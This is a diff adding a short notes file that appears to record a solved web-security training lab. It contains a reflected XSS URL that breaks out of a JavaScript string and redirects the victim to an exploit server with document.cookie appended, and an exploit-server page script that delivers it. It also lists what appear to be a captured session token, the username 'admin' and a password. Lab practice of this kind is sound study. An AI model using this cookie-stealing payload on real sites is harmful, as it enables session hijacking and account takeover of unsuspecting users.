@@ -1,0 +1,14 @@
+https://0a4d00b9047c857e8a56d0fc00ef002c.web-security-academy.net/?find=%22};window.location=%22https://exploit-0adf0012043585e68a6fcf6e01320008.exploit-server.net/exploit?%22%2bdocument.cookie//
+
+
+Hello, world!
+<script>
+window.location="https://0a4d00b9047c857e8a56d0fc00ef002c.web-security-academy.net/?find=%22};window.location=%22https://exploit-0adf0012043585e68a6fcf6e01320008.exploit-server.net/exploit?%22%2bdocument.cookie// "
+</script>
+
+
+P2F3JoANDxGRjQp0IZc8Fp4Zyuu2doyk
+
+admin
+
+irzrq6x2nr7tvnrzeoy8
